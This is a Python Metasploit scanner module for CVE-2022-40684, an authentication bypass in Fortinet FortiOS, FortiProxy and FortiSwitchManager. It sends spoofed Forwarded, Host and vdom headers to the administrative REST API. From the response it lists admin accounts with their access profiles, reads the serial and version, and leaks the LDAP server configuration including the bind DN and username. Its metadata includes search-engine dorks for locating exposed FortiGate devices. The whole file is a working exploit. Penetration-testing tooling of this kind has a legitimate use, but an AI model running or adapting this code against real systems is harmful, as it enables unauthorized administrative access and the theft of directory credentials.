#!/usr/bin/env python3
from metasploit import module

dependencies_missing = False
try:
    import requests
    import urllib3
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'Una omisión de autenticación usando una ruta o canal alternativo en el producto de Fortinet',
    'description': '''
    An authentication bypass using an alternate path or channel [CWE-288] in Fortinet FortiOS version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy version 7.2.0 and version 7.0.0 through 7.0.6 and FortiSwitchManager version 7.2.0 and 7.0.0 allows an unauthenticated atttacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests.
    app="FORTINET-防火墙" (fofa)
    title:"FortiGate" (zoomEye)
    title="FortiGate" (fofa)
    ''',
    'authors': ['Taroballz', 'ITRI-PTTeam'],
    'references': [
        {"type": "cve", "ref": "2022-40684"},
    ],
    'date': "2022-10-27",
    "type": "single_scanner",
    "options": {
        'rport': {'type': 'int', 'description': 'port', 'required': True, 'default': 443},
        'rssl': {'type': 'bool', 'description': 'Negotiate SSL for outgoing connections', 'required': True,
                 'default': 'true'},
        'username': {'type': 'string', 'description': 'The user name', 'required': True, 'default': 'admin'}
    }
}


def get_product_information(data):
    serial = data['serial']
    version = data['version']
    module.log(f'serial: {serial}', 'good')
    module.log(f'version: {version}', 'good')


def getLeakingConfig(sURL):
    headers = {
        "user-agent": "Node.js",
        "accept-encoding": "gzip, deflate",
        "Host": "127.0.0.1:9980",
        "forwarded": 'by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host=',
        "x-forwarded-vdom": "root",
    }
    ldap_url = sURL + '/api/v2/cmdb/user/ldap'

    try:
        module.log("try to get leak ldap config")
        ldap_req = requests.get(ldap_url, headers=headers, verify=False)
        ldap_result = ldap_req.json()
        if len(ldap_result['results']) > 0:
            module.log("Leaking ldap config", 'good')
            ldap_name = ldap_result['results'][0]['name']
            ldap_server = ldap_result['results'][0]['server']
            ldap_binddn = ldap_result['results'][0]['dn']
            ldap_username = ldap_result['results'][0]['username']
            module.log(
                f'LDAP SERVER {ldap_server} with name: {ldap_name}, binddn: {ldap_binddn}, username: {ldap_username}',
                'good')
    except Exception as e:
        module.log("get ldap result error: " + str(e), 'error')
        return


def run(args):
    if dependencies_missing:
        module.log("Module dependencies (requests) missing, cannot continue", level="error")
        return

    requests.packages.urllib3.disable_warnings()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    host = args['rhost']
    if host[-1:] == '/':
        host = host[:-1]
    if args["rssl"] == "true":
        sURL = 'https://' + host + ":" + args["rport"]
    else:
        sURL = "http://" + host + ":" + args["rport"]

    module.log(f"Target URL: {sURL}")

    payload_list = [
        {
            "vulnURL": f"{sURL}/api/v2/cmdb/system/admin/{args['username']}",
            "headers": {"User-Agent": "Report Runner", "Forwarded": 'for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"'},
            "userTraversal": False
        },
        {
            "vulnURL": f"{sURL}/api/v2/cmdb/system/admin",
            "headers": {
                "user-agent": "Node.js",
                "accept-encoding": "gzip, deflate",
                "Host": "127.0.0.1:9980",
                "forwarded": 'by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host=',
                "x-forwarded-vdom": "root",
            },
            "userTraversal": True
        },

    ]

    for attack in payload_list:
        url = attack['vulnURL']
        headers = attack['headers']
        try:
            req = requests.get(url, headers=headers, verify=False)
            if req.status_code != 200:
                module.log(f"GET request '{url}' failed", 'error')
                continue
            module.log(f"GET request '{url}' success, The target is vulnerable", 'good')
            data = req.json()

            # user traversal
            if attack["userTraversal"]:
                for user in data['results']:
                    module.log(f"admin username \'{user['name']}\' with access level \'{user['accprofile']}\'", 'good')

            # get product information
            get_product_information(data)

            # get leak ldap information
            getLeakingConfig(sURL)

            break

        except Exception as e:
            module.log(str(e), 'error')
    else:
        module.log(f"the target is NOT vulnerable", 'error')
        return

if __name__ == '__main__':
    module.run(metadata, run)
